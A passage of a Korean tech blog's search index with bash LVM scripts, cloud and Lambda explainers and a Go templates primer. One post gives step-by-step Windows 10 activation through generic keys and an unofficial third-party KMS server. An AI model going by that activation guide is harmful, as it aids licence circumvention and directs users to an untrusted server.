${LV[@]} echo `lvscan | grep $i` fi elif [ $Call == \u0026#34;6\u0026#34; ]; then RAID elif [ $Call == \u0026#34;7\u0026#34; ]; then for i in ${RAID[@]} echo `raidscan | grep $i` fi elif [ $Call == \u0026#34;8\u0026#34; ]; then ((Kron++)) fi done } LVM.txt # 정리 중 PVDevice: # PV 디바이스, 뛰어쓰기로 구분 # ex /dev/sda1 /dev/sda2 /dev/sdb3.... VGDevice : # VG 디바이스, 뛰어쓰기로 구분 # ex /dev/sda1 /dev/sda2 /dev/sdb3.... VGName : # 생성할 VG의 이름, 뛰어쓰기로 구분 # ex vg1 vg2 vg3 ... LVSize : # 생성할 LV의 용량 LVDevice : # LV 디바이스, 뛰어쓰기로 구분 # ex vg1 vg2 vg3 ... LVName : # 생성할 LV의 이름, 뛰어쓰기로 구분 # ex lv1 lv2 lv3 ...    파일에서 특정 단어를 찾아서 행을 변경하는 스크립트 #!/bin/bash  # 옵션에 맞게 스크립트를 실행시키세요. # ex Change.sh [File] [Keyword] [변경할 키워드] # ex Change.sh /etc/httpd//condf/httpd.conf Listen Listen 81 # 주의할 점은 띄어쓰기를 원할시 반드시 \u0026#34;_\u0026#34;로 표시해주세요. if [ -z $1 -o -z $2 -o -z $3 ]; then echo \u0026#34;Error : 잘못된 옵션을 입력하셨습니다.\u0026#34; else Num=`grep -n $2 $1 | sed \u0026#39;/#/d\u0026#39;` echo \u0026#34;\u0026#34; echo \u0026#34;변경 전 : $Num\u0026#34; echo \u0026#34;\u0026#34; Num=${Num%%:*} echo $3 \u0026gt; ./Change.txt Change=`sed -e \u0026#39;s/_/ /g\u0026#39; Change.txt` rm -rf ./Change.txt Num=`echo \u0026#34;$Nums/.*/\u0026#34; | tr -d \u0026#39; \u0026#39;` sed -i \u0026#34;$Num$Change/g\u0026#34; $1 Num=`grep -n $Change $1 | sed \u0026#39;/#/d\u0026#39;` echo \u0026#34;\u0026#34; echo \u0026#34;변경 후 : $Num\u0026#34; echo \u0026#34;\u0026#34; fi    예외처리 #!/bin/bash # 현재 공부중 function try() { [[ $- = *e* ]]; SAVED_OPT_E=$? set +e } function throw() { exit $1 } function catch() { export ex_code=$? (( $SAVED_OPT_E )) \u0026amp;\u0026amp; set +e return $ex_code } function throwErrors() { set -e } function ignoreErrors() { set +e }    ****    ****    ****    ****    ****    ****   "}),a.add({id:280,href:'/posts/',title:"Blog",content:""}),a.add({id:281,href:'/posts/linuxvesion/',title:"Linux Version 별 차이점",content:"Linux Version 별 차이점     보통 우리가 흔히 사용하는 CentOS, Ubuntu는 꾸준히 버전이 릴리즈되어 지고 있습니다.\n  그렇다면 릴리즈 별 바뀌는 요소가 무엇인지를 알아보도록 하겠습니다.\n     Ubuntu*      CentOS "}),a.add({id:282,href:'/posts/%EC%A0%95%EC%B2%98%EA%B8%B0/',title:"정보처리기사 합격후기",content:"정보치리기사 시험합격 후기    정보처리기사 1, 2화 통합 필기   공부기간   약 3개월, 기존 1개월로 잡았으나 코로나로 시험이 반복적으로 미루어져서 공부를 하다말다 하다말다 했습니다.\n  전공자라면 1주일도 충분히 가능하고, 비전공자여도 한 달이면 충분히 가능하다 생각됩니다.\n       시험내용   기본적으로 시험범위가 상당히 넓어 초독에는 많은 시간이 필요하다 생각됩니다. 그렇기에 핵심키워드 위주로 공부하시고, 다독하시는 걸 추천드립니다.\n  개정 후의 시험은 개정전과 많이 다르다고 공시되어 있지만, 또 그렇게 다르지도 않다고 많이들 말씀하셨습니다.\n  저는 작년도, 제작년도 기출문제는 보지도 않았지만 겹치는 유형은 그대로 출시되는 경향도 있어 푸시는 걸 추천드립니다.\n       시험 난이도   기본적으로 40% 중, 후반의 합격률을 보여주는 만큼 크게 어렵지 않은 시험이라 생각됩니다.\n  하지만 개정 후에는 5과목이 상당히 어렵다는 분들이 많아 주의가 필요하다 생각됩니다.\n       정보처리기사 2회 실기   공부기간   솔직하게는 1주일? 정도로 그것도 하는 둥 마는 둥하였습니다.\n  개인적으로 실기시험은 운이 강하게 작용해야한다고 생각하며, 전공자도 2주, 비전공자는 한달 남짓의 공부시간이 필요하다 생각됩니다.\n       시험내용   필기시험과 동일한 개념이 나오기도 하지만 기본적으로 약술 및 서술형의 문제인 만큼, 구체적인 학습이 요하는 만큼 많은 시간이 소요됩니다.\n  기본적인 핵심키워드 외의 서술형문항 또한 단단히 준비하셔야 합니다.\n  RTO와 같은 일반적인 용어도 출제됩니다.\n  JAVA, PYTHON, C의 간단한 함수들은 숙지하셔야 합니다.\n  SQL의 기초적인 부분을 다룰 수 있어야 합니다.\n  매 시험마다 보안문제들은 큰 배점을 차지하고 있습니다.\n  개정 후에는 전산영어가 없어졌지만 아이러니하게 실기 2회차에는 한 문제 출제된 걸로 기억하고 있습니다\u0026hellip;\n       시험 난이도   1회차 실기 합격률 5%이고, 제가 합격한 2회차 20%였습니다. 이와 같이 합격률이 필기시험에 저조한 만큼 더 집중하고, 구체적으로 공부하셔야하 합니다.\n  모든 시험이 약술 및 서술형인 만큼 아는 문제가 나오면 금방 풀지만, 모르는 문제가 나오면 멘탈이 흔들릴 수 있습니다. 하지만 대체적으로 문제의 답이 있는 경우가 많아 멘탈케어가 중요하다 생각됩니다.\n       정리    먼저 정처기는 과거의 개소자격증 분류로 있어 큰 메리트가 없는 시험이기도 하지만, 비전공자에게는 면접이라도 갈 수 있게 해주는 자격증입니다.\n  기본적으로 개정전, 개정후의 시험은 과목에서 많은 부분이 달라져 혹시 개정전 필기 합격 후, 개정 후 실기를 준비하시는 분은 따로 공부가 필요합니다.\n  저는 필기, 실기를 첫 시험에 합격하긴 했지만, 비전공자이어서 시험이 답답하다고 느꼈고, 개발자 중심의 시험이라고 느껴졌습니다.\n  개정전과의 시험을 비교했을 때는, 저는 잘 모르겠지만 아직 시행착오가 많은? 시험이라고들 말씀들 하십니다. 급히 필요하지 않으신 분은 합격률이 안정되고 시험을 보셔도 무방하다 생각됩니다.\n  하지만 막상 공부를 해보니 시험의 내용들이 과한 부분이 없지는 않았지만, 대체적으로 적합하다고도 느껴졌습니다.\n  끝으로 시험 준비하시는 분들도 좋은 결과 있기를 바라겠습니다.\n    "}),a.add({id:283,href:'/posts/lambda/',title:"Lambda",content:"Lambda   Lambda는 기본적으로 AWS의 서비스 중 하나인 Lambda를 의미하며 일반적으로 서버리스 아키텍처로 사용됩니다.\n  여기서 서버리스 아키텍처란 실행을 위해 서버에 직접 접근하지 않는 새로운 종류의 소프트웨어 아키텍처를 의미합니다.\n  Lambda는 AWS 기반에서 자바스크립트, 파이썬, C#, 자바로 작성한 코드를 실행하는 컴퓨팅 서비스입로, 소스 코드는 압축되어 메모리, 디스크 공간과 CPU가 할당된 격리된 컨테이너에 배포됩니다.\n  그럼 본격적으로 Lambda에 대해 알아보도록 하겠습니다.\n     Server or Serverless   Server  상단의 그림은 기본적인 3 tier 애플리케이션의 구조입니다. 3 tier 애플리케이션은 기본적으로 프레젠테이션, 애플리케이션, 데이터 단계로 구성되며, 하나의 단계는 위의 그림과 같이 특정 책임을 갖는 복수 단계의 계층을 가집니다. 일반적인 서버의 계층화는 관리영역을 분리하는 데 도움을 주지만, 되려 많은 계층은 변경을 어렵게 하며 구현속도를 저지시킬 수 있습니다. 또한 여러 계층에 관리영역이 걸쳐있다면, 모든 계층에서 문제가 발생할 수도 있습니다.     Serverless   반면에 서버리스 아키텍처는 전통적인 단일 백엔드 시스템이 없으며, 애플리케이션의 프론트엔드는 API Gateway로 직접 서비스, 데이터베이스 또는 컴퓨팅 함수와 통신합니다. 하지만 일부 서비스들은 추가적인 보안 조치의 유효성 검사가 수행되는 컴퓨팅 서비스 하수 뒤에 감추어져 있어야 합니다.\n  그럼 이제 본격적으로 서버리스 아키텍처가 무엇인지 알아보도록 하겠습니다.\n     Serverless Architecture   필요할 시에만 코드를 실행   서버리스 아키텍처는 기본적으로 SOA에서 제기된 개념을 자연스럽게 확장한 것으로, 서버리스 아키텍처에서 모든 사용자 코드는 AWS Lambda 같은 상태를 유지하지 않는 컴퓨팀 서비스에서 실행되는, 격리되고 독립적이며 때로는 세분화된 함수로 작성되고 실행됩니다. 개발자는 함수를 작성해 데이터 소스에서 데이터를 읽고 쓰고, 다른 함수를 호출 및 계산이 가능합니다.   SOA ( 서비스 지향 아키텍처 ) : 대규모 컴퓨터 시스템을 구축할 때의 개념으로 업무상의 일 처리에 해당하는 소프트웨어 기능을 서비스로 판단하여 그 서비스를 네트워크상에 연동하여 시스템 전체를 구축해 나가는 방법론을 뜻합니다.       단일 목적의 상태 없는 함수 작성    단일 책임의 원칙을 갖는 함수를 설계하려 노력해야 합니다. 한 가지의 역할만을 수행하는 함수의 테스트가 보다 쉽고 견고하며, 버그도 적고 디대하지 않은 부작용도 더 적습니다. Orchestration에서 함수와 서비스를 작성하고 조합해 이해하고 관리하기 쉬운 복잡한 백엔드 시스템을 구축할 수도 있으며, 또한 잘 정의된 인터페이스를 갖는 세분화된 함수는 서버리스 아키텍처에서 재사용될 가능성이 높습니다.    푸시 기반, 이벤트 주도 파이프라인 설계    서버리스 아키텍처는 어떤 용도로도 구축될 수 있으며, 초창기부터 서버리스로 구축할 수도 있고, 재설계가 가능합니다. 여기에서 가장 유연하고 강력한 서버리스 설계는 이벤트 주도 방식으로, 이벤트 주도, 푸시 기반 시스템의 구축으로 비용과 복잡성이 줄일 수 있습니다.    강력한 프론트엔드 구축    Lambda에서 동작하는 사용자 코드는 빨리 실행되야 한다는 것을 기억하는 것이 중요합니다. Lambda 가격은 함수 요청 횟수, 실행 시간, 할당된 메모리 크기를 기반으로 정해지므로 빨리 종료되는 함수가 더 저렴하다 할 수 있습니다.    상단의 그림은 푸시 기반 파이프라인 형태의 설계로, 사용자가 비디오를 업데이트하고, 비디오는 다른 형태로 변환되는 과정입니다. 사용자가 발행받는 토큰은 프론트엔드가 안전한 방식으로 데이터베이스를 포함한 여러 다른 서비스와 통신할 수 있게 합니다. 이것이 모든 통신이 백엔드 서버로 흘러가는 전통적인 시스템과 대비되는 부분입니다. 하지만 프론트엔드에서 처리하면 안되는 신용 카드, 이메일 전송 등에 대한 정보는 컴퓨팅 서비스를 사용해 동작을 조율하고 데이터를 검증 및 보안해야합니다.     Serverless의 장단점    기본적으로 서버리스를 구현하면 비용 절감과 출시 시간 단축이라는 장점이 있지만, 생성되는 애플리케이션의 관점에서의 서버리스 아키텍처로 가는 길은 신중하게 고려할 필요가 있습니다.    단일 구조의 애플리케이션의 변환    서버리스 아키텍처는 양자택일의 명제가 아니며, 현재 서버에서 실행 중인 단일 구조의 애플리케이션이 있다면, 구성 요소를 점진적으로 분리해 격리된 서비스나 컴퓨팅 함수를 실행해야 합니다.\n  또한 단일 구조의 애플리케이션을 IaaS, PaaS, 컨테이너, Lambda, 서드파티 서비스 등의 여러가지 형태로 분리가 가능합니다.\n  이와 같은 서버리스 아키텍처로의 변환은 개발자가 인프라가 아닌 소프트웨어 설계와 코드에 집중할 수 있게 해주며, 확장성과 고가용성 및 비용절감에 보다 공정하고 복잡성을 줄일 수 있지만, 특정 서비스에 따라서는 비용이 비효율적으로 발생할 수 있으며, 네트워크 기반의 장애가 발생한 경우, 처리가 어려운 단점 등이 존재합니다.\n    기본적인 서버리스 아키텍처의 원칙  하단의 서버리스 아키텍처의 원칙은 반드시 지켜야하는 원칙은 아니지만, 서버리스 애플리케이션 구축 시, 결정을 내리는 데 도움이 되는 원칙을 사용해야합니다.  1. 컴퓨팅 서비스를 사용해 요구에 맞게 코드를 실행한다. ( 서버 없이 ) 2. 단일 목적의 상태 없는 함수를 작성한다. 3. 푸시 기반 ( Push-based ), 이벤트 주도 ( event-driven ) 파이프라인을 설계한다. 4. 더 두텁고 강한 프런트엔드를 만든다. 5. 서드파티 서비스를 받아들인다.    "}),a.add({id:284,href:'/posts/window10/',title:"Window 10 무설치 정품인증",content:"Window 10 무설치 정품인증    단순히 Window 10의 명령프롬프트를 사용하여 간단하게 윈도우 인증을 완료하는 방법을 알려드리겠습니다.    명령프롬프트를 사용한 정품인증   먼저 검색 or 실행 ( Window 키 + R )에서 dxdiag 또는 winver를 검색 후, 운영체제의 버전을 확인해주세요. 위의 그림은 winver를 통해 확인한 모습입니다.      다음으로는 인증 키의 설정을 위해 위의 그림과 같이 명령 프롬프트를 관리자 권한으로 실행합니다.      아래의 명령어를 입력해주세요. [ licensekey는 하단의 표에서 본인에게 맞는 버전을 선택하여 복사해주세요. ]  $ slmgr /ipk [ licensekey ]    Version Key     Home TX9XD-98N7V-6WMQ6-BX7FG-H8Q99   Home N 3KHY7-WNT83-DGQKR-F7HPR-844BM   Home Single Language 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH   Home Country Specific PVMJN-6DFY6-9CCP6-7BKTT-D3WVR   Professional W269N-WFGWX-YVC9B-4J6C9-T83GX   Professional N MH37W-N47XK-V7XM9-C7227-GCQG9   Education NW6C2-QMPVW-D7KKK-3GKT6-VCFB2   Education N 2WH4N-8QGBV-H22JP-CT43Q-MDWWJ   Enterprise NPPR9-FWDCX-D2C8J-H872K-2YT43   Enterprise N DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4#       $ slmgr /skms kms8.msguides.com  입력이 완료되면 상단의 명령어를 입력하세요. KMS 서버와 연결됩니다.     $ slmgr /ato  KMS 서버에 인증이 완료되면 상단의 명령어를 입력합니다. 명령어를 Windows가 성공적으로 활성화되었음을 확인할 수 있습니다.     $ slmgr -xpr  상단의 명령어로 정품인증이 되었는 지 확인할 수 있습니다. 만약 정품 시디키를 구입하신 후에는 얼마든지 재인증을 할 수 있습니다.  만약 제거를 원하실 경우 하단의 명령어를 입력 후 재 시작하세요.\r$ slmgr.vbs /upk\r$ slmgr.vbs /cpky\r    위 그림은 인증 순서를 순서대로 입력한 그림입니다. 단 6개월 주기로 기간이 만료되니, 갱신이 필요합니다. Window 10 시디키는 보통 웹에서 저렴하게 구매가 가능하니, 오래 사용하실 분들은 구매하시는 걸 추천드립니다.     "}),a.add({id:285,href:'/posts/cloud/',title:"클라우드란? (CloudComputing)",content:"클라우드란?   클라우드 (Cloud)    클라우드의 영어 ‘Cloud’는 우리가 흔히 알고 있는 \u0026lsquo;구름’을 뜻합니다. 컴퓨터 파일을 저장할 때 작업한 컴퓨터 내부에 있는 공간이 아니라 인터넷을 통하여 중앙 컴퓨터에 저장할 수 있는 데 이 공간을 클라우드라 합나다.\n  즉, 클라우드를 정의하기는 모호한 면이 있지만, 기본적으로 각각 고유한 기능을 가진 서버의 글로벌 네트워크를 설명하는 데 사용되는 용어입니다.\n  클라우드는 실제 엔터티가 아니지만 함께 연결되어 하나의 에코시스템으로 작동하게 되어 있는 ​전 세계에 분산된 원격 서버의 광대한 네트워크로, 이러한 서버는 데이터의 저장 및 관리, 애플리케이션 실행 또는 스트리밍 비디오, 웹 메일, 오피스 생산성 소프트웨어 또는 소셜 미디어와 같은 미디어와 같은 콘텐츠 또는 서비스를 제공하도록 설계되어 있습니다. 또한 인터넷 지원 디바이스에서 온라인으로 엑세스하므로 언제 어디에서나 필요한 정보를 사용할 있는 특징을 가지고 있습니다.\n     클라우드 기술의 활용유무 개념  기본 PC 인프라  \r클라우드 PC 인프라  \r\r    위와 같이 클라우드란 네트워크 상의 일종의 가상의 컴퓨터와 연결하여 그 컴퓨터와 연결된 각각의 기능 등을 제공받을 수 있는 하나의 대형 플랫폼을 뜻한다고 할 수 있습니다.\n  이러한 클라우드의 가장 큰 특징은 소유자와 사용자가 다르다는 것이 가장 큰 특징입니다.\n  클라우드란 모든 리소스를 소유하고 해당 리소스를 통해 새로운 서비스를 만드는 형태의 기술입니다. 기본적으로 Public cloud 와 Private cloud와 나뉘어 있는 데, Public 은 불특정 다수에게 제공하며, Private는 특정 기업에 제공하는 형태입니다. 하지만 이 외에도 Public Cloud와 Private Cloud를 조합한 하이브리드 클라우드, 특정 업종의 기업들이 함께 운영하는 커뮤니티 클라우드의 형태도 있습니다.\n     클라우드를 적용해야할 상황 및 장점  ​\n  빠른 시작\n 이제 사업을 시작하려는 사람도 클라우드 컴퓨팅을 통해 적은 비용으로 매우 빨리 비즈니스 플랜을 손쉽게 테스트해 볼 수 있다는 장점이 있습니다.    확장성\n 소유한 자원으로 효율적인 응용이 가능하다.    ​\n 사업적 민첩성\n 클라우드 컴퓨팅은 적은 비용으로도 민첩하게 대응할 수 있습니다    ​\n   보다 빠른 제품 개발\n  기본적인 작업환경을 몇 주에서 몇 분으로 작업시간을 단축할 수 있는 데, 이는 여러 기술을 응용해서 사용하는 과학, 기술계에 효과적으로 작용됩니다.\n    자본 지출 불필요\n     클라우드를 피해야할 상황 및 단점    엄청난 인터넷 전송 용량에 따른 초과 비용의 위험\n 클라우드는 사용량의 따라 비용을 청구하여 저렴하게 작용될 때도 있지만, 때로는 이와는 반대로 더 고비용이 청구될 수도 있습니다.    ​\n 애플리케이션 퍼포먼스의 문제\n 아직까지 네트워크 속도의 문제가 있어 이를 고려하지 않으면 불상사가 발생할 수 있습니다.    ​\n 클라우드에는 적합하지 않은 데이터\n 가상이라는 것은 결국 해킹 당할 위험이 있다는 것으로 개인정보와 같은 엄격히 관리해야할 데이터는 클라우드에는 적합하지 않습니다.    ​\n 회사 규모에 따른 제한\n 회사가 클수록 IT 자원 역시 커지는 데, 이를 잘 고려해야 비용적으로 우위에 위치시킬 수 있습니다.    ​\n 인적 자원의 부재\n 아직 클라우드 관련 기술에 대해 수요는 급증에 있지만, 이를 전문적으로 다룰 인재들이 부족하여, 되려 잘못된 접근은 실망만을 안겨줄 수 있습니다.    ​\n  즉, 클라우드 기술을 정리하자면, 내가 가지고 있지 않은 기술들을 빌려서 사용하게 할 수 있는 일종의 플랫폼이라 생각할 수 있습니다.\n  이러한 클라우드의 가장 큰 장점은 내가 장비, 기술 등이 부족하여도 이를 어디서든지 사용할 수 있다는 것이지만, 현재는 아직까지 사용하기 적합한 인프라가 갖춰지지 않은 곳이 두루 있으며, 이를 전문적으로 다룰 인력도 부족한 편이여, 되려 자원을 절약하기 위해 적용시켰다가, 더욱 더 고비용이 청구되는 경우도 있어 주의가 필요합니다.\n    "}),a.add({id:286,href:'/posts/publiccloud/',title:"퍼블릭 클라우드 ( Public Cloud )",content:"퍼블릭 클라우드 ( Public Cloud )     클라우드는 그 서비스 형태에 따라 퍼블릭( Public Cloud ), 하이브리드 클라우드 (Hybrid Cloud ), 프라이빗 클라우드 ( Pivate Cloud ), 커뮤니티( Community Cloud )로 나뉘어저 있습니다.\n  이번에는 그 중 퍼블릭 클라우드 ( Public Cloud )에 대해 알아보겠습니다.\n  퍼블릭 클라우드( Publci Cloud )란 외부 클라우드 사업자가 제공하는 서비스를 통해 클라우드를 이용하는 것으로, 우리가 가장 흔히 접할 수 있는 서비스 형태입니다. 즉 서비스를 위한 모든 인프라를 클라우드에서 제공받는 것으로 자체 인프라가 없거나 부족한 스타트업, 중견기업이 많이 이용하고 있습니다.\n     퍼블릭 클라우드( Public Cloud )의 개념     즉, 퍼블릭 클라우드는 고객이 물리적 서버를 구매하거나 설치할 필요가 없어, 비용적으로 효율적인 솔루션이라고 할 수도 있습니다.\n  이를 퍼블릭 클라우드와 프라이빗 클라우드의 가장 큰 차이는 프라이빗 클라우드는 한 조직만을 위하여 운영되는 반면, 퍼블릭은 다수의 대중을 위하여 인터넷 기반으로 운영된다는 것입니다.\n  "}),a.add({id:287,href:'/posts/privatecloud/',title:"프라이빗 클라우드 (Private Cloud)",content:"프라이빗 클라우드 (Private Cloud)     클라우드는 그 서비스 형태에 따라 퍼블릭( Public Cloud ), 하이브리드 클라우드 (Hybrid Cloud ), 프라이빗 클라우드 ( Pivate Cloud ), 커뮤니티( Community Cloud )로 나뉘어저 있습니다.\n  이번에는 그 중 프라이빗 클라우드 ( Private Cloud )에 대해 알아보겠습니다.\n  프라이빗 클라우드란 기업이 직접 클라우드 환경을 구축하고 이를 기업 내부에서 활용하거나 또는 계열사에 공개하는 것을 뜻합니다.\n     프라이빗 클라우드의 개념   프라이빗 클라우드의 개념     외부 클라우드 사업자의서비스를 이용하지 않고 서비스를 위한 인프라를 직접 구축한다는 점에서 프라이빗 클라우드는 자체 인프라 구축과 동일하다고 할 수 있습니다. 하지만 이는 온프레미스와 동일하게 보일 수도 있지만, 이는 다르다는 것을 설명드려보겠습니다.\n  온프레미스와 프라이빗 클라우드의 가장 큰 차이점은 클라우드 핵심 능력을 보유하고 있는지에 대한 여부입니다. 클라우드의 핵심 능력은 신속함, 확장성이며, 기업의 서비스에 사용자가 몰리면 프라이빗 클라우드는 해당 서비스를 위한 인프라를 증설해 빠르게 서비스를 안정화 시킬 수 있습니다. 하지만 온프레미스는 이것이 어려우며, 새로 주문하고 이를 설치하기까지 보통 1-2주의 시간이 소요되어 서비스의 안정이 힘들다고 할 수 있습니다.\n     프라이빗 클라우드와 온 프레미스의 차이     위에 사진과 같이 만약 서버의 증설이 필요할 경우 프라이빗 클라우드의 경우 서버의 세팅을 통해서 공간을 활용할 수 있으며, 또한 필요공간의 확장도 쉽습니다. 하지만 온 프레스미스의 경우 기본적으로 용량이 부족할 경우 또 다른 서버를 구매해야하는 데 이에 따른 자원소요가 크다는 차이가 있습니다.\n  이러한 신속함을 갖추기 위해 프라이빗 클라우드는 두가지 핵심 기술을 갖추고 있습니다. 그 중 첫 번째는 가상화이며, 가상화는 클라우드를 지탱하는 핵심 기술이라 할 수 있습니다. 가상화란 솔루션을 통해 하나의 거대한 인프라 파워로 환산하는 기술로 이 인프라 내에서 가상의 네트워크 장치, 서버, 스토리지 등을 생성한 후 이를 조합해 가상의 인프라( 가상머신 )을 만들고 여기에 운영체제를 설치하고 소프트웨어와 서비스를 구동시키는 것입니다.\n     라이빗 클라우드의 핵심기술    가상머신 위에 설치된 운영체제와 소프트웨어는 한 대의 인프라에서 실행되는 것이 아닌, 수 십 대의 실제 인프라가 각자의 능력을 조금씩 각출해서 가상머신을 만든 후 운영체제와 소프트웨어를 실행하는 것입니다. 가상화 솔루션은 이렇게 각출한 능력을 조합해 가상머신이 기존 인프라와 동일한 능력을 발휘할 수 있도록 하는 것이며, 만약 고장이 날 경우도, 온 프레미스와 달리 바로 다른 인프라에서 능력을 각출해오기 때문에 아무 문제 없이 소프트웨어를 실행하고 서비스를 지속적으로 제공할 수 있습니다.  ​\n 두 번째는 클라우드 관리 스택으로 가상화 기술을 통해 데이터 센터나 인프라의 가상화를 완료했다고 하더라도 이를 바로 프라이빗 클라우드라고 할 수는 없습니다. 가상화는 본래 인프라에 문제가 발생해도 서비스가 중단되지 않도록 하는 안정성을 확보할 수 있는 기술이기에 가상화된 인프라 속에서 가상머신을 자유롭게 생성하거나 제거할 수 있어야 프라이빗 클라우드라 할 수 있으며, 이를 위해 가상머신을 관리할 수 있는 클라우드 관리 스택이 함께 필요합니다.  ​\n 이와 같이 기업이 클라우드 관리 스택을 확보하는 방법은 크게 2가지로, 상용화된 클라우드 관리 스택을 구매하여 적용시키거나, 직접 클라우드 관리 스택을 개발하는 것입니다.  ​\n 클라우드 관리 스택 구매는 크게 특정 기업의 기술을 이용하는 것과 ( AWS, AZURE 등 )과 오픈소스를 활용하는 것으로 나눌 수 있습니다.  ​\n 즉, 기업은 데이터 센터와 인프라의 가상화를 완료한 후 애저 스택, IBM 클라우드 프라이빗, 오픈 스택, 클라우드 스택 등을 적용해 프라이빗 클라우드 환경을 구축할 수 있습니다.  ​\n  이렇게 사용화된 클라우드 관리 스택을 이용하지 않고 기업이 직접 클라우드 관리 스택을 개발한 경우도 있는 데, 이에 대한 공통적인 목표는 바로 퍼블릭 클라우드 사업자가 되는 것입니다. 즉, 프라이빗 클라우드를 구축해서 회사의 계열사의 서비스를 운영해 클라우드 역량을 확보한 후, 클라우드 사업에 진출하려는 것이 바로 프라이빗 클라우드를 구축하는 기업들의 본심이라 할 수 있습니다.\n  프라이빗 클라우드는 많은 조직에서 클라우드 네트워크를 향한 자연스러운 첫 단계로, 퍼블릭 클라우드와 관련된 보안에 대한 우려 없이 민첩성, 확장성, 효율성과 같은 클라우드의 이점을 제공하기 때문입니다. 하지만 현재는 이미 프라이빗과 퍼블릭의 관계가 모호해지고 있으며, 현재는 결국 하이브리드 클라우드로 변형될 것을 예측하고 있습니다.\n    "}),a.add({id:288,href:'/posts/hybridcloud/',title:"하이브리드 클라우드 ( Hybrid Cloud )",content:"하이브리드 클라우드 ( Hybrid Cloud )     클라우드는 그 서비스 형태에 따라 퍼블릭( Public Cloud ), 하이브리드 클라우드 (Hybrid Cloud ), 프라이빗 클라우드 ( Pivate Cloud ), 커뮤니티( Community Cloud )로 나뉘어저 있습니다.\n  이번에는 그 중 하이브리드 클라우드 ( Hybrid Cloud )에 대해 알아보겠습니다.\n  하이브리드 클라우드는 퍼블릭 클라우드( Public Cloud )와 프라이빗 클라우드 ( Pivate Cloud )를 결합하여 데이터와 애플리케이션을 공유할 수 있는 컴퓨팅 환경으로, 하이브리드 컴퓨팅은 컴퓨팅 및 처리 요구가 변동될 때 타사 데이터 센터에서 데이터 전체에 엑세스하지 않고도 온-프레미스 공용 클라우드로 원할하게 확장하여 오버플로를 처리할 수 있는 기능을 기업에게 제공하는 것을 뜻합니다.\n  즉 이를 활용하면 고객은 중요한 비즈니스 애플리케이션 및 데이터를 회사 방화벽 뒤의 온-프레미스에 안전하게 보관하면서 기본 및 중요하지 않은 컴퓨팅 작업은 공용 클라우드에서 유연하게 컴퓨팅 할 수 있습니다.\n     하이브리드 클라우드 ( Hybrid Cloud )의 구조    하이브리드 클라우드는 보기와 같이 온-프레미스에서 구현되어 있는 기업의 내부환경과 외부의 클라우드를 연동하여 내부적으로는 안전한 정보를 보관하고, 기본 및 중요하지 않은 정보는 클라우드를 활용해 유연하게 컴퓨팅하는 기술입니다.  ​\n  이와 같이 하이브리드 클라우드를 활용하면 기업에서의 컴퓨팅 리소스를 확장할 수 있을 뿐 아니라, 단기간의 데이터의 처리가 급증하거나, 혹은 중요한 데이터와 로컬 리소스를 확보 해야할 때, 따로 자본을 지출할 필요가 없습니다. ​\n  즉, 기업의 입장에서는 장기간 유휴 상태로 남아 있을 수 있는 리소스들과 장비들을 절약할 수 있고, 데이터의 노출의 위험을 최소화 하면서 클라우드 컴퓨팅의 모든 이점을 제공할 수 있는 최상의 플랫폼이라 할 수 있습니다.\n    "}),a.add({id:289,href:'/posts/goisforlovers/',title:"테스트",content:"Hugo uses the excellent Go html/template library for its template engine. It is an extremely lightweight engine that provides a very small amount of logic. In our experience that it is just the right amount of logic to be able to create a good static website. If you have used other template systems from different languages or frameworks you will find a lot of similarities in Go templates.\nThis document is a brief primer on using Go templates. The Go docs provide more details.\nIntroduction to Go Templates Go templates provide an extremely simple template language. It adheres to the belief that only the most basic of logic belongs in the template or view layer. One consequence of this simplicity is that Go templates parse very quickly.\nA unique characteristic of Go templates is they are content aware. Variables and content will be sanitized depending on the context of where they are used. More details can be found in the Go docs.\nBasic Syntax Golang templates are HTML files with the addition of variables and functions.\nGo variables and functions are accessible within {{ }}\nAccessing a predefined variable \u0026ldquo;foo\u0026rdquo;:\n{{ foo }}\r Parameters are separated using spaces\nCalling the add function with input of 1, 2:\n{{ add 1 2 }}\r Methods and fields are accessed via dot notation\nAccessing the Page Parameter \u0026ldquo;bar\u0026rdquo;\n{{ .Params.bar }}\r Parentheses can be used to group items together\n{{ if or (isset .Params \u0026quot;alt\u0026quot;) (isset .Params \u0026quot;caption\u0026quot;) }} Caption {{ end }}\r Variables Each Go template has a struct (object) made available to it. In hugo each template is passed either a page or a node struct depending on which type of page you are rendering. More details are available on the variables page.\nA variable is accessed by referencing the variable name.\n\u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt;\r Variables can also be defined and referenced.\n{{ $address := \u0026quot;123 Main St.\u0026quot;}}\r{{ $address }}\r Functions Go template ship with a few functions which provide basic functionality. The Go template system also provides a mechanism for applications to extend the available functions with their own. Hugo template functions provide some additional functionality we believe are useful for building websites. Functions are called by using their name followed by the required parameters separated by spaces. Template functions cannot be added without recompiling hugo.\nExample:\n{{ add 1 2 }}\r Includes When including another template you will pass to it the data it will be able to access. To pass along the current context please remember to include a trailing dot. The templates location will always be starting at the /layout/ directory within Hugo.\nExample:\n{{ template \u0026quot;chrome/header.html\u0026quot; . }}\r Logic Go templates provide the most basic iteration and conditional logic.\nIteration Just like in Go, the Go templates make heavy use of range to iterate over a map, array or slice. The following are different examples of how to use range.\nExample 1: Using Context\n{{ range array }}\r{{ . }}\r{{ end }}\r Example 2: Declaring value variable name\n{{range $element := array}}\r{{ $element }}\r{{ end }}\r Example 2: Declaring key and value variable name\n{{range $index, $element := array}}\r{{ $index }}\r{{ $element }}\r{{ end }}\r Conditionals If, else, with, or, \u0026amp; and provide the framework for handling conditional logic in Go Templates. Like range, each statement is closed with end.\nGo Templates treat the following values as false:\n false 0 any array, slice, map, or string of length zero  Example 1: If\n{{ if isset .Params \u0026quot;title\u0026quot; }}\u0026lt;h4\u0026gt;{{ index .Params \u0026quot;title\u0026quot; }}\u0026lt;/h4\u0026gt;{{ end }}\r Example 2: If -\u0026gt; Else\n{{ if isset .Params \u0026quot;alt\u0026quot; }}\r{{ index .Params \u0026quot;alt\u0026quot; }}\r{{else}}\r{{ index .Params \u0026quot;caption\u0026quot; }}\r{{ end }}\r Example 3: And \u0026amp; Or\n{{ if and (or (isset .Params \u0026quot;title\u0026quot;) (isset .Params \u0026quot;caption\u0026quot;)) (isset .Params \u0026quot;attr\u0026quot;)}}\r Example 4: With\nAn alternative way of writing \u0026ldquo;if\u0026rdquo; and then referencing the same value is to use \u0026ldquo;with\u0026rdquo; instead. With rebinds the context . within its scope, and skips the block if the variable is absent.\nThe first example above could be simplified as:\n{{ with .Params.title 